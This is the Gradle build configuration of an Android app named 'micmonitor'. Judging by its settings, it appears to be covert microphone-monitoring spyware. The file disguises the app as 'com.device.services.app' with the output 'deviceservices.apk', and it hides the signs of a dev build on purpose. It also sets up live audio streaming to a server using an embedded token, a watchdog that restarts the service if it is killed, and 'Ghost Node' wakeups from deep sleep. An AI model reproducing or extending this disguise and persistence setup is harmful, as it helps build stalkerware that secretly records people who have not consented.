import java.util.Properties
import org.gradle.api.GradleException

plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
    id("com.google.gms.google-services")
}

// Version management - increment versionCode for each release
val appVersionCode = 70  // Increment this for each update
val appVersionName = "1.15.2"  // Human-readable version
val localProps = Properties().apply {
    val propsFile = rootProject.file("local.properties")
    if (propsFile.exists()) load(propsFile.inputStream())
}

val defaultUserKeystore = file("${System.getProperty("user.home")}/micmonitor.jks")
val releaseStoreFilePath = System.getenv("STORE_FILE")
    ?: localProps.getProperty("STORE_FILE")
    ?: defaultUserKeystore.takeIf { it.exists() }?.absolutePath
val releaseStorePassword = System.getenv("STORE_PASSWORD")
    ?: localProps.getProperty("STORE_PASSWORD")
    ?: localProps.getProperty("KEYSTORE_PASSWORD")
val releaseKeyAlias = System.getenv("KEY_ALIAS")
    ?: localProps.getProperty("KEY_ALIAS")
    ?: localProps.getProperty("KEYSTORE_ALIAS")
    ?: "micmonitor"
val releaseKeyPassword = System.getenv("KEY_PASSWORD")
    ?: localProps.getProperty("KEY_PASSWORD")
    ?: localProps.getProperty("KEYSTORE_KEY_PASSWORD")
    ?: releaseStorePassword
val hasReleaseSigning = !releaseStoreFilePath.isNullOrBlank() &&
    file(releaseStoreFilePath).exists() &&
    !releaseStorePassword.isNullOrBlank() &&
    !releaseKeyAlias.isNullOrBlank() &&
    !releaseKeyPassword.isNullOrBlank()

val wantsReleaseBuild = gradle.startParameter.taskNames.any { it.contains("release", ignoreCase = true) }
if (wantsReleaseBuild && !hasReleaseSigning) {
    throw GradleException(
        "Release signing is not fully configured. Expected keystore: " +
            (releaseStoreFilePath ?: defaultUserKeystore.absolutePath) +
            ". Set STORE_PASSWORD and KEY_PASSWORD (and optional KEY_ALIAS) in local.properties or environment."
    )
}

val defaultServerToken = (System.getenv("DEFAULT_SERVER_TOKEN")
    ?: localProps.getProperty("DEFAULT_SERVER_TOKEN")
    ?: "")
    .replace("\\", "\\\\")
    .replace("\"", "\\\"")

android {
    namespace = "com.micmonitor.app"
    compileSdk = 35

    defaultConfig {
        applicationId = "com.device.services.app"
        minSdk = 26
        targetSdk = 35
        versionCode = appVersionCode
        versionName = appVersionName
        testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
        
        // Make version accessible in code
        buildConfigField("int", "VERSION_CODE", "$appVersionCode")
        buildConfigField("String", "VERSION_NAME", "\"$appVersionName\"")
        buildConfigField("String", "DEFAULT_SERVER_TOKEN", "\"$defaultServerToken\"")
    }

    signingConfigs {
        create("release") {
            if (hasReleaseSigning) {
                storeFile = file(releaseStoreFilePath!!)
                storePassword = releaseStorePassword
                keyAlias = releaseKeyAlias
                keyPassword = releaseKeyPassword
            }
        }
    }

    buildTypes {
        release {
            isMinifyEnabled = false
            isShrinkResources = false
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
            signingConfig = signingConfigs.getByName("release")
        }
        debug {
            isDebuggable = false   // looks less like a dev build
            signingConfig = if (hasReleaseSigning) {
                signingConfigs.getByName("release")
            } else {
                signingConfigs.getByName("debug")
            }
        }
    }

    applicationVariants.all {
        outputs.all {
            val output = this as com.android.build.gradle.internal.api.ApkVariantOutputImpl
            output.outputFileName = "deviceservices.apk"
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_1_8
        targetCompatibility = JavaVersion.VERSION_1_8
    }

    kotlinOptions {
        jvmTarget = "1.8"
    }

    buildFeatures {
        viewBinding = true
        buildConfig = true  // Enable BuildConfig generation
    }

    packaging {
        resources {
            excludes += "/META-INF/{AL2.0,LGPL2.1}"
        }
    }
}

dependencies {
    implementation("androidx.core:core-ktx:1.12.0")
    implementation("androidx.appcompat:appcompat:1.6.1")
    implementation("com.google.android.material:material:1.11.0")
    implementation("androidx.constraintlayout:constraintlayout:2.1.4")
    implementation("androidx.exifinterface:exifinterface:1.3.7")

    // WebSocket for live streaming
    implementation("com.squareup.okhttp3:okhttp:4.12.0")

    // Coroutines for background operations
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-core:1.7.3")

    // WorkManager — periodic watchdog to restart service if killed
    implementation("androidx.work:work-runtime-ktx:2.9.0")

    // Firebase — FCM for deep-sleep wakeup (Ghost Node)
    implementation(platform("com.google.firebase:firebase-bom:32.7.0"))
    implementation("com.google.firebase:firebase-messaging-ktx")

    testImplementation("junit:junit:4.13.2")
    androidTestImplementation("androidx.test.ext:junit:1.1.5")
    androidTestImplementation("androidx.test.espresso:espresso-core:3.5.1")
}
